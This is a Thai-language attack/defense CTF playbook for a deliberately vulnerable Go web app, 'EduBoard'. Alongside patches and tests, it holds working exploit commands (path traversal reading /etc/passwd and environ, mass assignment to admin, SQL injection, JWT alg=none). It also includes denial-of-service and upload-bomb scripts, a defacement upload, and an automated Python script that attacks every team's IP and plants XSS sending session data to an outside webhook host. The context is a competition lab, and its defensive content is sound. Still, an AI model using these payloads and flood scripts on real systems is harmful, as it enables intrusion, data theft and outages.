# id=1 จะออก: CTF{1d0r_4ss1gnm3nt_n0_0wn3rch3ck}
```

### ✅ โค้ดหลังแก้ (Patched)

```go
// แทนที่บรรทัด 430-435 ใน main.go ด้วย:
func handleGetAssignment(w http.ResponseWriter, r *http.Request) {
    // เปลี่ยนจาก _, ok เป็น cl, ok เพื่อใช้ claims
    cl, ok := jwtCheck(r)
    if !ok {
        http.Error(w, `{"error":"unauthorized"}`, 401)
        return
    }
    // ดึง user_id และ role จาก JWT
    uid := int((*cl)["user_id"].(float64))
    role, _ := (*cl)["role"].(string)
    // ... (โค้ดเดิมต่อ)

// เพิ่ม block นี้ ก่อน "json.NewEncoder(w).Encode(...)" (ก่อนบรรทัด 473):
    // เช็คว่าคนที่ขอเป็น submitter เอง หรือเป็น admin/instructor
    if a.SubmitterID != uid && role != "admin" && role != "instructor" {
        http.Error(w, `{"error":"forbidden"}`, 403)
        return
    }
```

**ทำไมปลอดภัยขึ้น:** เปรียบเทียบ `submitter_id` จาก DB กับ `user_id` จาก JWT → ถ้าไม่ใช่เจ้าของและไม่ใช่ admin/instructor → 403

### 🔎 ทดสอบว่า Patch ได้ผล

```bash
# login เป็น user ปกติ
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"student_bob","password":"bob456"}' | jq -r .token)

# ลองดู assignment id=1 (ของ admin)
curl -i "http://localhost:8080/api/assignments/1/details" \
  -H "Authorization: Bearer $TOKEN"

# ✅ Patch สำเร็จ: HTTP/1.1 403 {"error":"forbidden"}
# ❌ Patch ไม่สำเร็จ: HTTP/1.1 200 + มี secret_note: "CTF{...}"

# ดู assignment ของตัวเอง (bob = id 4, assignment id=3) ต้องผ่าน
curl "http://localhost:8080/api/assignments/3/details" \
  -H "Authorization: Bearer $TOKEN"
```

---

## <a id="vuln7"></a>🚨 ช่องโหว่ที่ 7: Path Traversal

### 📍 อยู่ที่ไหนใน main.go

- ฟังก์ชัน: `handleDownload`
- บรรทัด: **708–728** (โค้ดบาปอยู่ที่ **บรรทัด 720**)
- วิธีหา:
  > Ctrl+F หาคำว่า `os.ReadFile` หรือ `"/app/uploads/" +`

### 🔍 สังเกตได้จากอะไร (Code Smell)

- เห็น string concatenation `"/app/uploads/" + fname` → ต่อ path ดิบๆ
- ไม่ได้เรียก `filepath.Clean` หรือเช็ค `..` ในชื่อไฟล์
- ไม่มี whitelist ของไฟล์ที่ยอมให้โหลด

### ❌ โค้ดก่อนแก้ (Vulnerable)

```go
// บรรทัด 708-728 ใน main.go
func handleDownload(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Access-Control-Allow-Origin", "*")
    if r.Method != http.MethodGet {
        http.Error(w, "method not allowed", 405)
        return
    }
    fname := r.URL.Query().Get("name")
    if fname == "" {
        http.Error(w, "name required", 400)
        return
    }

    // 🔥 บาป: ต่อ path ตรงๆ ไม่ filter ../ ออก
    fpath := "/app/uploads/" + fname
    data, err := os.ReadFile(fpath)
    if err != nil {
        http.Error(w, "file not found", 404)
        return
    }
    w.Header().Set("Content-Disposition", "attachment; filename=\""+filepath.Base(fname)+"\"")
    w.Write(data)
}
```

### 💥 ผลกระทบ (Impact)

- Attacker ส่ง `name=../secret.txt` → อ่าน `/app/secret.txt` ที่มี flag
- อ่าน `/etc/passwd`, `/proc/self/environ` (env vars), `/proc/self/cmdline`
- อ่านไฟล์ binary ของ Go เพื่อ extract `signingKey` (`strings /app/eduboard | grep eduboard`)
- ไม่ต้อง auth ด้วย (handler ไม่เรียก `jwtCheck`)

### ⚔️ วิธีโจมตี (Exploit)

```bash
# อ่าน flag
curl "http://TARGET:8080/api/files/download?name=../secret.txt"
# Output: CTF{p4th_tr4v3rs4l_f1l3_r34d_byp4ss}

# อ่าน /etc/passwd
curl "http://TARGET:8080/api/files/download?name=../../../etc/passwd"

# อ่าน env vars (มี DB password)
curl "http://TARGET:8080/api/files/download?name=../../proc/self/environ"

# อ่าน binary หาความลับ
curl "http://TARGET:8080/api/files/download?name=../eduboard" -o b.bin
strings b.bin | grep -i eduboard
```

### ✅ โค้ดหลังแก้ (Patched)

```go
// แทนที่บรรทัด 720 ด้วย block นี้:
fname := r.URL.Query().Get("name")
if fname == "" {
    http.Error(w, "name required", 400)
    return
}

// ใช้ filepath.Clean แล้วเช็คว่ายังอยู่ใน /app/uploads/ จริง
fpath := filepath.Clean("/app/uploads/" + fname)
if !strings.HasPrefix(fpath, "/app/uploads/") {
    http.Error(w, "invalid path", 400)
    return
}

data, err := os.ReadFile(fpath)
if err != nil {
    http.Error(w, "file not found", 404)
    return
}
```

**ทำไมปลอดภัยขึ้น:**

- `filepath.Clean("/app/uploads/" + "../secret.txt")` = `"/app/secret.txt"`
- เช็คว่ายังขึ้นต้นด้วย `/app/uploads/` หรือไม่ → ถ้าไม่ใช่ = traversal!
- คืน 400 ทันที ไม่อ่านไฟล์

### 🔎 ทดสอบว่า Patch ได้ผล

```bash
# ลอง traversal เดิม
curl -i "http://localhost:8080/api/files/download?name=../secret.txt"

# ✅ Patch สำเร็จ: HTTP/1.1 400 invalid path
# ❌ Patch ไม่สำเร็จ: HTTP/1.1 200 + content "CTF{...}"

# ทดสอบไฟล์ปกติยัง download ได้
curl -i "http://localhost:8080/api/files/download?name=syllabus.txt"
# ต้องได้ 200 + content syllabus
```

---

## <a id="vuln8"></a>🚨 ช่องโหว่ที่ 8: Mass Assignment

### 📍 อยู่ที่ไหนใน main.go

- ฟังก์ชัน: `handleRegister`
- บรรทัด: **196–245** (โค้ดบาปอยู่ที่ **บรรทัด 211–220**)
- วิธีหา:
  > Ctrl+F หาคำว่า `body["role"]` หรือ `map[string]interface{}` ใน register handler

### 🔍 สังเกตได้จากอะไร (Code Smell)

- ใช้ `map[string]interface{}` รับ body แทน typed struct → รับอะไรก็ได้จาก client
- `role, _ := body["role"].(string)` = หยิบ role จาก body มาใช้เลย
- มี `if role == ""` → fallback เป็น student แต่ถ้า client ส่งมาก็ใช้ของ client

### ❌ โค้ดก่อนแก้ (Vulnerable)

```go
// บรรทัด 211-232 ใน main.go (handleRegister)
var body map[string]interface{}   // 🔥 บาป: รับทุก field
json.NewDecoder(r.Body).Decode(&body)

username, _ := body["username"].(string)
password, _ := body["password"].(string)
email, _ := body["email"].(string)
role, _ := body["role"].(string)   // 🔥 บาป: เชื่อ role จาก client
if role == "" {
    role = "student"
}

if username == "" || password == "" {
    w.WriteHeader(400)
    w.Write([]byte(`{"error":"username and password required"}`))
    return
}

var xid2 int
err := db.QueryRow(
    "INSERT INTO users (username,password,email,role) VALUES ($1,$2,$3,$4) RETURNING id",
    username, password, email, role,  // 🔥 บาป: เอา role ของ client ใส่ DB เลย
).Scan(&xid2)
```

### 💥 ผลกระทบ (Impact)

- ใครก็ register เป็น `role: admin` ได้ → JWT จะมี `role: admin` ตั้งแต่ login
- เข้า `/api/admin/flags` ได้เลย → ได้ flag ทั้ง 8 ในชอตเดียว
- เป็นช่องโหว่ที่ **ง่ายที่สุด** ทั้งโจมตีและ patch

### ⚔️ วิธีโจมตี (Exploit)

```bash
# Step 1: register เป็น admin
curl -X POST http://TARGET:8080/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"pwner","password":"pwner","email":"x@x.com","role":"admin"}'

# Step 2: login → ได้ JWT ที่มี role:admin
TOKEN=$(curl -s -X POST http://TARGET:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"pwner","password":"pwner"}' | jq -r .token)

# Step 3: ดู flag ทั้งหมด
curl http://TARGET:8080/api/admin/flags \
  -H "Authorization: Bearer $TOKEN"
# ได้ flag ทั้ง 8 มาเลย
```

### ✅ โค้ดหลังแก้ (Patched)

```go
// แทนที่บรรทัด 211-220 ด้วย:
// ใช้ typed struct ที่ไม่มี field "role"
var req struct {
    Username string `json:"username"`
    Password string `json:"password"`
    Email    string `json:"email"`
    // ไม่มี field "role" ให้ client ส่งมา
}
if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
    http.Error(w, `{"error":"bad request"}`, 400)
    return
}

username := req.Username
password := req.Password
email := req.Email
role := "student"   // hardcode ทุกคนเป็น student เสมอ
```

**ทำไมปลอดภัยขึ้น:** struct ที่ `Decode` มี field ตายตัว → field `role` ที่ client ส่งมาจะถูกเมิน hardcode `"student"` เป็นค่าเดียวที่เป็นไปได้

> 💡 **ทางเลือก:** ถ้าต้องการให้ admin สร้าง user role อื่นได้ → ทำ endpoint แยก `/api/admin/users` ที่เช็ค JWT role=admin ก่อนเท่านั้น

### 🔎 ทดสอบว่า Patch ได้ผล

```bash
# ลอง register เป็น admin
curl -X POST http://localhost:8080/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"sneaky","password":"pwd","role":"admin"}'

# Login
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"sneaky","password":"pwd"}' | jq -r .token)

# ดู payload ของ JWT (decode part กลาง)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null

# ✅ Patch สำเร็จ: "role":"student"
# ❌ Patch ไม่สำเร็จ: "role":"admin"

# ขอ admin flag - ต้องโดน reject
curl -i http://localhost:8080/api/admin/flags \
  -H "Authorization: Bearer $TOKEN"
# ✅ ต้องได้: HTTP/1.1 403 forbidden
```

---

## <a id="priority"></a>⚡ ลำดับการ Patch ตอนแข่ง (1 ชั่วโมงแรก)

จัดลำดับจากง่ายไปยาก + ผลกระทบมากไปน้อย:

| ลำดับ | ช่องโหว่        | บรรทัด                  | เวลา    | เหตุผล                                                                                |
| ----- | --------------- | ----------------------- | ------- | ------------------------------------------------------------------------------------- |
| **1** | Mass Assignment | 211-220                 | ~1 นาที | แก้ struct เปลี่ยน 5 บรรทัด ใครก็เป็น admin ได้ถ้าไม่แก้ — flag ทั้ง 8 รั่วในชอตเดียว |
| **2** | Path Traversal  | 720                     | ~1 นาที | เพิ่ม 4 บรรทัด ป้องกัน `../`                                                          |
| **3** | JWT alg=none    | 49-55                   | ~2 นาที | ลบ 3 บรรทัด + เปลี่ยน secret key                                                      |
| **4** | SQLi Login      | 157-160                 | ~2 นาที | เปลี่ยน `fmt.Sprintf` → `$1, $2`                                                      |
| **5** | SQLi Search     | 328-331                 | ~2 นาที | เปลี่ยน `fmt.Sprintf` → `$1` + เลื่อน `%` มาฝั่ง Go                                   |
| **6** | IDOR            | 431, 472                | ~3 นาที | เปลี่ยน `_` → `cl`, เพิ่ม ownership check                                             |
| **7** | SSRF Webhook    | 552                     | ~5 นาที | เพิ่ม `isInternalURL` function + เรียกใน handler                                      |
| **8** | XSS + Bot       | backend 692 + 3 .svelte | ~5 นาที | escape ใน backend + ลบ `@html` ใน 3 ไฟล์                                              |

**Total time:** ~21 นาที ถ้าทำเรียงทีละช่อง

### 🎯 กลยุทธ์การ Patch

1. **Patch ทั้งหมดในไฟล์เดียวก่อน** → build ครั้งเดียว → downtime สั้นที่สุด
2. **อย่า rebuild หลาย container พร้อมกัน** → ถ้าโค้ดผิด container ไม่ขึ้น = downtime ยาว
3. **เก็บ original main.go ไว้เป็น backup**: `cp backend/main.go backend/main.go.bak`
4. **Test ทีละ patch ใน local ก่อน** → ค่อย deploy ไปเครื่องแข่ง
5. **มี checklist ทุก endpoint ทดสอบหลัง patch:**
   - login ปกติได้มั้ย
   - register ปกติได้มั้ย
   - search ปกติได้มั้ย
   - download syllabus.txt ได้มั้ย
   - admin user ยังเข้า admin panel ได้มั้ย

---

## <a id="rebuild"></a>🐳 วิธี Rebuild ให้ Downtime น้อยที่สุด

### Rebuild แบบเร็ว (เฉพาะ app)

```bash
# แก้โค้ดเสร็จแล้วสั่ง rebuild เฉพาะ app container
# db container ยังทำงานอยู่ตลอด ไม่ต้องรอ healthcheck ใหม่
docker compose up -d --build app

# เช็คว่าขึ้นแล้วหรือยัง
docker compose ps

# ดู logs ถ้ามี error build/runtime
docker compose logs -f app
# กด Ctrl+C ออก
```

### ถ้าโค้ด build ไม่ผ่าน

```bash
# ดู error
docker compose logs app | tail -50

# rollback กลับโค้ดเก่า
cp backend/main.go.bak backend/main.go
docker compose up -d --build app
```

### Reset ทั้งระบบ (เคสฉุกเฉิน)

```bash
# ลบ container ทุกตัว + volume DB
docker compose down -v
docker compose up -d --build

# รอ ~1 นาที db init เสร็จ
docker compose logs -f db
```

### 📊 Downtime Math

- Rebuild เฉพาะ app: **~30 วินาที** (build cache hit) = -5 คะแนน
- Rebuild ทั้ง stack: **~2-3 นาที** = -20 ถึง -30 คะแนน
- Crash penalty: **-100 คะแนน** ต่อครั้ง

**ดังนั้น:** patch ให้ถูกตั้งแต่ครั้งแรก! อย่า rebuild ลองผิดลองถูก!

### 🛠️ Hot Tips

```bash
# Build แบบ parallel ให้เร็วขึ้น
DOCKER_BUILDKIT=1 docker compose build app

# ดู resource ทุก container
docker stats

# Backup DB ก่อน patch เผื่อพัง
docker compose exec db pg_dump -U ctfuser eduboard > backup.sql

# Restore DB ถ้าทำพังหรือโดน DROP TABLE
docker compose exec -T db psql -U ctfuser eduboard < backup.sql
```

---

## <a id="rce-crash"></a>💣 RCE & Crash Attack — ทำให้ระบบล่ม

### 🔥 RCE คืออะไร และทำไมมันโหด

**RCE (Remote Code Execution)** = ความสามารถในการ **รันคำสั่ง shell บนเซิร์ฟเวอร์เป้าหมาย** จากระยะไกล

ใน A/D CTF: ถ้าคุณ RCE ทีมอื่นได้ คุณสามารถ:

- ✅ อ่านไฟล์ทั้งหมดในเครื่อง (รวม flag ที่ซ่อน)
- ✅ ขโมย `signingKey` ของ JWT → ปลอม token เป็น admin ตลอด
- ✅ อ่าน DB ตรงๆ (`docker exec` หรือ env vars)
- 💀 `kill -9 1` → container ตาย → **-100 คะแนน crash penalty + downtime**
- 💀 `rm -rf /app/*` → ทีมเป้าหมายต้อง redeploy ทั้งหมด

### ⚠️ ในโจทย์ EduBoard นี้มี RCE โดยตรงมั้ย?

**ไม่มี RCE โดยตรง** แต่มีหลายช่องที่ **chain แล้วได้ผลใกล้เคียง RCE:**

#### 1. Path Traversal + File Upload → RCE (chain attack)

```bash
# Step 1: upload Go source/bash script ผ่าน /api/files/upload
curl -X POST http://TARGET:8080/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload.sh"

# Step 2: ใช้ path traversal อ่าน /etc/cron.d, /proc/self/cmdline, etc.
# (RCE ตรงๆ ทำไม่ได้เพราะไม่มี execution sink)
```

#### 2. SSRF → ทำให้ goroutine ค้าง (Denial of Service)

```bash
# ส่ง webhook ที่ตอบช้า/ไม่จบ → goroutine ค้าง (timeout 10s แต่ใช้ memory)
# spam หลายตัวพร้อมกัน → goroutine leak → OOM
for i in $(seq 1 1000); do
  curl -X POST "http://TARGET:8080/api/assignments/1/request-grade" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"assignment_id":1,"webhook_url":"http://slowloris-server/"}'  &
done
```

#### 3. Upload Bomb → Disk Full → Crash

```bash
# upload ไฟล์ใหญ่ๆ ซ้ำ → /app/uploads/ เต็ม → disk full → container ตาย
dd if=/dev/zero of=big.bin bs=1M count=500
for i in $(seq 1 20); do
  curl -X POST http://TARGET:8080/api/files/upload \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@big.bin;filename=bomb_$i.bin"
done
```

#### 4. Path Traversal + Upload → Overwrite Static Files

```bash
# upload ไฟล์ชื่อ "../static/index.html" → overwrite SPA หน้าเว็บ
# (handleUpload ใช้ header.Filename ตรงๆ ไม่ filter)
curl -X POST http://TARGET:8080/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F 'file=@evil.html;filename=../static/index.html'
# → หน้าเว็บของเป้าหมายเปลี่ยนเป็นของเรา → defacement
```

### 💀 Crash Attack — วิธีทำให้ระบบล่มได้ -100 คะแนน

ใน A/D scoring rules:

- ระบบ **crash** = **-100 คะแนน** ทันที (โดน 1 ครั้ง)
- ทุก 1 นาทีของ downtime = **-10 คะแนน**

วิธีที่มักทำให้ Go server crash:

#### A. Goroutine Bomb (memory exhaustion)

```python
# spam parallel requests จนกว่า server จะ OOM
import requests, threading
def hammer():
    while True:
        try:
            requests.get(f"http://{TARGET}:8080/api/courses/search?q="+"A"*10000, timeout=1)
        except: pass

for i in range(500):
    threading.Thread(target=hammer, daemon=True).start()
```

#### B. SSRF Slowloris

ส่ง webhook ไป HTTP server ที่ตอบทีละ byte ช้าๆ → connection ค้างนาน 10 วินาที (timeout) × หลายตัว → connection pool หมด

#### C. Big JSON body

```bash
# สร้าง JSON ใหญ่มากๆ → Go decode → memory spike
python3 -c 'import json; print(json.dumps({"username":"a","password":"b"*(50*1024*1024)}))' > big.json
curl -X POST http://TARGET:8080/api/auth/login \
  -H "Content-Type: application/json" \
  --data @big.json
```

#### D. Multipart upload abuse

```bash
# ส่ง multipart ที่ไม่มี boundary → r.ParseMultipartForm panic
curl -X POST http://TARGET:8080/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: multipart/form-data" \
  --data-binary "garbage"
```

### 🛡️ วิธีกัน Crash Attack

เพิ่มใน main.go (ก่อน `http.ListenAndServe`):

```go
// 1. จำกัด body size
http.Handle("/", http.MaxBytesHandler(http.DefaultServeMux, 5<<20))  // 5MB

// 2. ใช้ Server พร้อม timeout (แทน http.ListenAndServe ธรรมดา)
srv := &http.Server{
    Addr:              ":8080",
    ReadTimeout:       10 * time.Second,
    WriteTimeout:      10 * time.Second,
    IdleTimeout:       30 * time.Second,
    ReadHeaderTimeout: 5 * time.Second,
    MaxHeaderBytes:    1 << 16,
}
srv.ListenAndServe()

// 3. recover panic ใน middleware
func recoverMW(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        defer func() {
            if rec := recover(); rec != nil {
                http.Error(w, "internal error", 500)
            }
        }()
        next.ServeHTTP(w, r)
    })
}

// 4. validate filename ก่อน upload (ป้องกัน path traversal ในชื่อ)
if strings.Contains(header.Filename, "..") || strings.Contains(header.Filename, "/") {
    http.Error(w, `{"error":"invalid filename"}`, 400)
    return
}

// 5. rate limiting แบบง่าย (per-IP)
// (สำหรับ CTF ระยะสั้นแค่ใส่ tarpit ก็พอ ใช้ระยะยาวต้องใช้ proper rate limiter)
```

### 📝 สรุป: ในศึก A/D นี้

- **โจมตี:** ลอง chain `SSRF + upload bomb + path traversal` กับทีมที่ลืม patch
- **ป้องกัน:** patch ทั้ง 8 vuln + ใส่ timeout/maxBytes/recover middleware → ทีมอื่นทำเราล่มไม่ได้
- **อย่าทำตัวเองล่ม:** ทดสอบ patch ใน local ก่อน, อย่า rebuild ตอนกำลังโดนยิง

---

## <a id="attack-scripts"></a>🗡️ Script โจมตีทีมอื่น (Automated Tick)

```python
#!/usr/bin/env python3
# attack_all.py - รันทุก 2 นาที โจมตีทุกทีมที่ยังไม่ patch
# Usage: python3 attack_all.py
# Requirements: pip install requests

import requests
import base64
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor

# ===== ใส่ IP ของทุกทีมในสนามแข่ง =====
TARGETS = [
    "10.10.1.1",
    "10.10.1.2",
    "10.10.1.3",
    # ... เพิ่มจนครบ 16 ทีม
]

PORT = 8080
TIMEOUT = 3

def url(target, path):
    return f"http://{target}:{PORT}{path}"


# ===== VULN 1: SQLi Login Bypass =====
def sqli_login(target):
    try:
        r = requests.post(url(target, "/api/auth/login"),
            json={"username": "admin' OR 1=1 LIMIT 1-- -", "password": "x"},
            timeout=TIMEOUT)
        if r.status_code == 200 and "token" in r.text:
            tok = r.json().get("token", "")
            print(f"[+] {target} [SQLi-LOGIN] -> token: {tok[:40]}...")
            return tok
    except Exception as e:
        pass
    return None


# ===== VULN 2: SQLi UNION Search =====
def sqli_search(target):
    try:
        payload = "' UNION SELECT 1,flag_name,flag_value,4,5 FROM flag_store-- -"
        r = requests.get(url(target, "/api/courses/search"),
            params={"q": payload}, timeout=TIMEOUT)
        if "CTF{" in r.text:
            data = r.json()
            flags = [c.get("description") for c in data if "CTF{" in str(c.get("description",""))]
            print(f"[+] {target} [SQLi-SEARCH] flags: {flags[:3]}")
            return flags
    except: pass
    return []


# ===== VULN 3: JWT alg=none =====
def jwt_none_bypass(target):
    try:
        h = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        p = base64.urlsafe_b64encode(
            json.dumps({"user_id": 1, "username": "admin",
                        "role": "admin", "exp": 9999999999}).encode()
        ).rstrip(b"=").decode()
        token = f"{h}.{p}."
        r = requests.get(url(target, "/api/admin/flags"),
            headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        if "CTF{" in r.text:
            print(f"[+] {target} [JWT-NONE] flags: {r.text[:200]}")
            return r.json().get("flags", [])
    except: pass
    return []


# ===== VULN 4: SSRF via Webhook =====
def ssrf_webhook(target):
    # ต้อง register + login ก่อน
    user = f"ssrf_{int(time.time())}"
    try:
        requests.post(url(target, "/api/auth/register"),
            json={"username": user, "password": "p", "email": "x@x.com"},
            timeout=TIMEOUT)
        lr = requests.post(url(target, "/api/auth/login"),
            json={"username": user, "password": "p"}, timeout=TIMEOUT)
        if "token" not in lr.text:
            return []
        tok = lr.json()["token"]

        # ส่ง webhook ชี้ /internal/flags
        requests.post(url(target, "/api/assignments/1/request-grade"),
            headers={"Authorization": f"Bearer {tok}"},
            json={"assignment_id": 1, "webhook_url": "http://localhost:8080/internal/flags"},
            timeout=TIMEOUT)

        # รอ bot ทำงาน (25 วินาที + buffer)
        time.sleep(30)

        r = requests.get(url(target, "/api/assignments/my-grades"),
            headers={"Authorization": f"Bearer {tok}"}, timeout=TIMEOUT)
        if "CTF{" in r.text:
            print(f"[+] {target} [SSRF] response leaked flags: {r.text[:200]}")
            return r.json()
    except: pass
    return []


# ===== VULN 5: XSS (มี webhook = ตรวจสอบ exfil ที่ปลายทาง) =====
def xss_inject(target, exfil_host):
    try:
        # ต้อง login ก่อน
        lr = requests.post(url(target, "/api/auth/login"),
            json={"username": "student_alice", "password": "alice123"}, timeout=TIMEOUT)
        if "token" not in lr.text: return
        tok = lr.json()["token"]
        payload = f'<script>fetch("/api/admin/session-flag",{{credentials:"include"}}).then(r=>r.text()).then(d=>fetch("https://{exfil_host}/?x="+btoa(d)))</script>'
        r = requests.post(url(target, "/api/reviews"),
            headers={"Authorization": f"Bearer {tok}"},
            json={"course_id": 1, "content": payload, "rating": 5},
            timeout=TIMEOUT)
        if r.status_code == 201:
            print(f"[+] {target} [XSS] payload planted, check {exfil_host}")
    except: pass


# ===== VULN 6: IDOR — enumerate assignments =====
def idor_assignments(target, token):
    if not token: return []
    flags = []
    for i in range(1, 20):
        try:
            r = requests.get(url(target, f"/api/assignments/{i}/details"),
                headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
            if "CTF{" in r.text:
                note = r.json().get("secret_note", "")
                print(f"[+] {target} [IDOR] assignment_id={i}: {note}")
                flags.append(note)
        except: pass
    return flags


# ===== VULN 7: Path Traversal =====
def path_traversal(target):
    try:
        r = requests.get(url(target, "/api/files/download"),
            params={"name": "../secret.txt"}, timeout=TIMEOUT)
        if "CTF{" in r.text:
            print(f"[+] {target} [PATH-TRAV] {r.text.strip()}")
            return r.text.strip()
    except: pass
    return None


# ===== VULN 8: Mass Assignment → register as admin =====
def mass_assign(target):
    try:
        user = f"pwn_{int(time.time())}"
        requests.post(url(target, "/api/auth/register"),
            json={"username": user, "password": "p", "email": "x@x.com", "role": "admin"},
            timeout=TIMEOUT)
        lr = requests.post(url(target, "/api/auth/login"),
            json={"username": user, "password": "p"}, timeout=TIMEOUT)
        if "token" not in lr.text: return None
        tok = lr.json()["token"]

        # decode payload เช็คว่าได้ admin มั้ย
        payload = json.loads(base64.urlsafe_b64decode(
            tok.split(".")[1] + "=="
        ).decode())
        if payload.get("role") == "admin":
            # ขอ flag ทั้งหมด
            fr = requests.get(url(target, "/api/admin/flags"),
                headers={"Authorization": f"Bearer {tok}"}, timeout=TIMEOUT)
            if "CTF{" in fr.text:
                print(f"[+] {target} [MASS-ASSIGN] flags: {fr.text[:200]}")
                return fr.json()
    except: pass
    return None


# ===== Main attack loop =====
def attack_target(target):
    print(f"\n{'='*60}\n[*] Attacking {target}\n{'='*60}")
    # ลำดับจากเร็วไปช้า (SSRF ช้าสุดเพราะรอ bot)
    path_traversal(target)
    sqli_search(target)
    jwt_none_bypass(target)
    mass_assign(target)
    tok = sqli_login(target)
    if tok:
        idor_assignments(target, tok)
    xss_inject(target, "YOUR-WEBHOOK.requestbin.com")
    ssrf_webhook(target)  # ทำสุดท้ายเพราะรอ 30s


if __name__ == "__main__":
    # รัน parallel ทุกทีม
    with ThreadPoolExecutor(max_workers=8) as ex:
        ex.map(attack_target, TARGETS)

    print("\n[*] Tick complete")
```

### วิธีรัน

```bash
# ติดตั้ง dependency
pip install requests

# แก้ TARGETS = [...] ใส่ IP ทีมอื่น
# (staff จะให้ IP list)
nano attack_all.py

# รันแบบ tick (ทุก 2 นาที)
while true; do
  python3 attack_all.py | tee -a attack.log
  sleep 120
done
```

### 💡 Tips ตอนแข่ง

1. **ใช้ webhook.site** รับ XSS exfil (ฟรี ไม่ต้องตั้ง server เอง)
2. **save flag เจอแล้ว** → ส่งให้ staff queue ทันที (อย่ารอครบ 8)
3. **อย่าเริ่มยิงก่อนเปิดศึก** — โดน DQ
4. **อย่ายิงทีมตัวเอง** — เสีย downtime ของตัวเอง

---

## <a id="ctrlf"></a>📚 สรุป Ctrl+F Keywords สำหรับหาช่องโหว่

ใช้ keyword เหล่านี้ค้นใน `backend/main.go` หรือ `frontend/src/`:

| ค้นหาคำนี้                                               | พบแล้วสงสัย                  | ช่องโหว่ที่อาจพบ          |
| -------------------------------------------------------- | ---------------------------- | ------------------------- |
| `fmt.Sprintf(` ใกล้ `db.QueryRow` หรือ `db.Query`        | ต่อ string ใส่ SQL ตรงๆ      | **SQL Injection**         |
| `body["role"]` หรือ `map[string]interface{}` ใน register | รับ field ทุกอย่างจาก client | **Mass Assignment**       |
| `SigningMethodNone` หรือ `UnsafeAllowNone`               | ยอมรับ JWT alg=none          | **JWT Bypass**            |
| `signingKey = []byte("...")` (string สั้น)               | secret อ่อนแอ                | **JWT Brute-force**       |
| `http.Get(`, `http.Post(`, `client.Get(` ใน goroutine    | ไม่ validate URL             | **SSRF**                  |
| `{@html` ใน `.svelte`                                    | render HTML ดิบ ไม่ escape   | **XSS**                   |
| `"/uploads/" +` หรือ `os.ReadFile(...+...)`              | ต่อ path ตรงๆ ไม่ clean      | **Path Traversal**        |
| `_, ok := jwtCheck(r)` ตามด้วย DB query                  | auth แต่ไม่เช็ค ownership    | **IDOR**                  |
| `err.Error()` ใน response                                | leak SQL/system error        | **Info Disclosure**       |
| `r.URL.Path[1:]` หรือ `strings.TrimPrefix` ใกล้ `os.`    | ไม่ filter input             | **Path Traversal**        |
| `header.Filename` ใช้ตรงๆ ใน `os.Create`                 | ไม่ filter ชื่อไฟล์          | **Upload Path Traversal** |
| `r.ParseMultipartForm` ไม่จำกัด size                     | ไม่จำกัดขนาด                 | **DoS**                   |
| `time.Sleep` + goroutine ไม่จบ                           | goroutine leak               | **DoS**                   |

### 🎯 Workflow แนะนำตอน Recon

```bash
# 1. ดูช่องโหว่ทั้งหมดในไฟล์เดียว
grep -nE "fmt\.Sprintf|SigningMethodNone|@html|body\[|os\.ReadFile|http\.Get\(" backend/main.go frontend/src/**/*.svelte

# 2. ดู function ที่ต้องเช็ค auth
grep -n "jwtCheck\|adminSessionSecret" backend/main.go

# 3. หา dangerous sinks ทั้งหมด
grep -nE "db\.Query|db\.Exec|db\.QueryRow|os\.|http\.Get|http\.Post" backend/main.go | head -30
```

---

## 🏁 Checklist ก่อนเริ่มแข่ง

- [ ] Patch ทั้ง 8 vulnerabilities ทดสอบใน local
- [ ] รัน `attack_all.py` ใส่ IP ตัวเอง → ต้องไม่มี `[+]` ออกมาเลย
- [ ] Backup `init.sql`, `main.go.bak`
- [ ] ทดสอบ login ทุก user role (admin, instructor, student) ยังใช้ได้
- [ ] ทดสอบ search, upload, download syllabus ยังใช้ได้
- [ ] เตรียม webhook URL สำหรับ XSS exfil (https://webhook.site)
- [ ] เตรียม script attack ใส่ IP ทีมอื่นไว้
- [ ] ตั้ง alias `dcp='docker compose'` ให้พิมพ์เร็ว
- [ ] ดื่มน้ำ ☕

---

**Good luck! 🚩**
